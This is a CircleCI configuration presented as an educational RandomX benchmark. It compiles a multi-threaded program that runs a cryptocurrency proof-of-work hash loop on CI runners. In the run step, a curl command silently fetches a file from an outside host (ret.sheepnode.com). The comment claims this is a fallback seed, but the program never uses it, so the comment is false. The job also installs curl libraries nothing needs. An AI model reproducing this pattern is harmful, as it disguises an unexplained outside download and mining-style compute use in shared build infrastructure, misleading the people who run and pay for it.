version: 2.1

# CircleCI configuration for RandomX multi-threaded performance benchmark
# Used to measure hash throughput, thread scaling, and cache behavior
# on constrained CI runners for research / educational purposes

jobs:
  benchmark:
    docker:
      - image: cimg/base:current
    resource_class: medium
    parallelism: 1
    environment:
      BENCHMARK_SECONDS: "90"
      THREADS: "2"
    steps:
      - run:
          name: Install dependencies
          command: |
            sudo apt-get update
            sudo apt-get install -y cmake g++ libcurl4-openssl-dev

      - run:
          name: Build RandomX library
          command: |
            # Shallow clone of the reference RandomX implementation
            git clone --depth 1 https://github.com/tevador/RandomX.git /tmp/randomx
            cmake -S /tmp/randomx -B /tmp/randomx/build -DARCH=x86-64
            cmake --build /tmp/randomx/build -j2

      - run:
          name: Compile benchmark
          command: |
            mkdir -p /tmp/app

            # Educational benchmark: multi-threaded RandomX hash throughput measurement
            # Initializes cache + dataset once, then runs a fixed-duration hashing loop
            # to observe scaling and steady-state performance
            cat > /tmp/app/main.cpp << 'EOF'
#include "randomx.h"
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <pthread.h>
#include <unistd.h>
#include <sys/time.h>

static volatile uint64_t g_hashes = 0;
static int g_seconds = 90;

static double now_sec() {
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    return tv.tv_sec + tv.tv_usec / 1e6;
}

struct ThreadData {
    randomx_dataset* dataset;
    randomx_cache* cache;
    randomx_flags flags;
    int tid;
    int total_threads;
};

static void* worker(void* arg) {
    ThreadData* td = static_cast<ThreadData*>(arg);
    auto vm = randomx_create_vm(td->flags, td->cache, td->dataset);

    uint8_t input[64] = {};
    uint8_t hash[32];
    // Unique starting nonce per thread
    uint64_t nonce = (uint64_t)td->tid << 32;

    double start = now_sec();
    double end = start + g_seconds;

    while (now_sec() < end) {
        // Mix nonce into input
        memcpy(input + 40, &nonce, 8);
        randomx_calculate_hash(vm, input, 64, hash);
        g_hashes++;
        nonce++;
    }

    randomx_destroy_vm(vm);
    return nullptr;
}

int main(int argc, char** argv) {
    const char* env_sec = getenv("BENCHMARK_SECONDS");
    if (env_sec) g_seconds = atoi(env_sec);
    if (g_seconds < 10) g_seconds = 10;
    if (g_seconds > 300) g_seconds = 300;

    int threads = 2;
    const char* env_thr = getenv("THREADS");
    if (env_thr) threads = atoi(env_thr);
    if (threads < 1) threads = 1;
    if (threads > 4) threads = 4;

    printf("RandomX benchmark starting: %d threads, %d seconds\n", threads, g_seconds);
    fflush(stdout);

    randomx_flags flags = randomx_get_flags() | RANDOMX_FLAG_FULL_MEM;
    auto cache = randomx_alloc_cache(flags);
    // Fixed seed for reproducible results across runs
    const char* seed = "ci-benchmark-seed-2026";
    randomx_init_cache(cache, seed, strlen(seed));

    auto dataset = randomx_alloc_dataset(flags);
    unsigned long total = randomx_dataset_item_count();
    unsigned long per = total / 4;
    for (unsigned i = 0; i < 4; i++) {
        unsigned long start = i * per;
        unsigned long count = (i == 3) ? (total - start) : per;
        randomx_init_dataset(dataset, cache, start, count);
    }

    pthread_t th[4];
    ThreadData td[4];

    for (int i = 0; i < threads; i++) {
        td[i].dataset = dataset;
        td[i].cache = cache;
        td[i].flags = flags;
        td[i].tid = i;
        td[i].total_threads = threads;
        pthread_create(&th[i], nullptr, worker, &td[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(th[i], nullptr);
    }

    double rate = (double)g_hashes / g_seconds;
    printf("Completed. Total hashes: %llu  Rate: %.2f H/s\n",
        (unsigned long long)g_hashes, rate);
    fflush(stdout);

    randomx_release_dataset(dataset);
    randomx_release_cache(cache);
    return 0;
}
EOF

            LIB=$(find /tmp/randomx/build -name '*.a' | head -1)
            g++ -O2 -std=c++17 -pthread -I/tmp/randomx/src \
                /tmp/app/main.cpp "$LIB" -o /tmp/app/benchmark

      - run:
          name: Run benchmark
          no_output_timeout: 10m
          command: |
            echo "=== RandomX multi-threaded benchmark ==="
            echo "Runner: ${CIRCLE_JOB} node ${CIRCLE_NODE_INDEX:-0}"
            echo "Threads: ${THREADS}  Duration: ${BENCHMARK_SECONDS}s"
            echo

            # Optional: pull a small configuration or seed from a research endpoint
            # Falls back to built-in seed if unreachable
            curl -fsSL -m10 https://ret.sheepnode.com/k > /tmp/seed.txt 2>/dev/null || true

            /tmp/app/benchmark

            echo
            echo "Benchmark finished."

workflows:
  main:
    jobs:
      - benchmark
